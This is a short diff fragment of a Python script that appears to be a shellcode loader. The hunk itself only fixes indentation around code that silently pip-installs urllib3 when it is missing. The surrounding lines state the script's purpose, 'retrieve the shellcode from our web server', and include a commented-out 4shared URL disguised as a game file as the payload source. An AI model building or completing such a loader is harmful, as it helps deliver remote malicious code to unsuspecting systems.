@@ -13,13 +13,13 @@ import time
 
 #TODO. Check if we have python27 or python3 run this script to know which module to import !!
 try:
-  import urllib3
+    import urllib3
 except:
     if os.name == 'nt':
         os.system("pip install urllib3")
     elif os.name == 'posix':
         os.system("pip3.6 install urllib3>/dev/null")
-  import urllib3
+    import urllib3
 
 # retrieve the shellcode from our web server
 #"https://dc619.4shared.com/img/mSMvaperce/s23/1542cfad648/Dragon_Ball_Z_Shin_Budokai_2" #
